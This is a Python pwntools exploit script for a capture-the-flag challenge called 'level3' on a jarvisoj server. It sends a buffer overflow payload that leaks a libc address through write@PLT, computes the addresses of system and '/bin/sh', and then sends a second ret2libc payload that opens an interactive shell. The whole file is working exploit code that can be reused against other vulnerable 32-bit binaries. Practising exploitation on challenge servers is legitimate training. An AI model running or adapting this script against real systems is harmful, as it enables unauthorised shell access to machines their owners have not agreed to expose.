#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./level3")
	level3 = ELF("./level3")
	libc = ELF("/lib32/libc.so.6")
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("pwn2.jarvisoj.com","9879")
	level3 = ELF("./level3")
	libc = ELF("./libc-2.19.so")
#gdb.attach(io)
#context.log_level = "debug"
write_plt = 0x08048340
binsh_addr = 0x0804A024
poppoppop_ebx = 0x08048519
vunlu_addr = 0x0804844b
payload = ""
payload += 0x88*"A"
payload += "junk"
payload += p32(write_plt)
payload += p32(poppoppop_ebx)
payload += p32(1)
payload += p32(level3.got["__libc_start_main"])
payload += p32(4)
payload += p32(vunlu_addr)
io.sendline(payload)
io.recvuntil("Input:\n")
write_got = u32(io.recv().strip("Input:\n"))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
write = libc.symbols["__libc_start_main"]
libc_base = write_got - write
system_got = libc_base + system
binsh_got = libc_base + binsh
system2 = 0xf7599850
libcstart2 = 0xf7577190
print libcstart2-write
print system2-system
payload = ""
payload += 0x88*"A"
payload += "junk"
payload += p32(system_got)
payload += "junk"
payload += p32(binsh_got)
io.sendline(payload)
io.interactive()
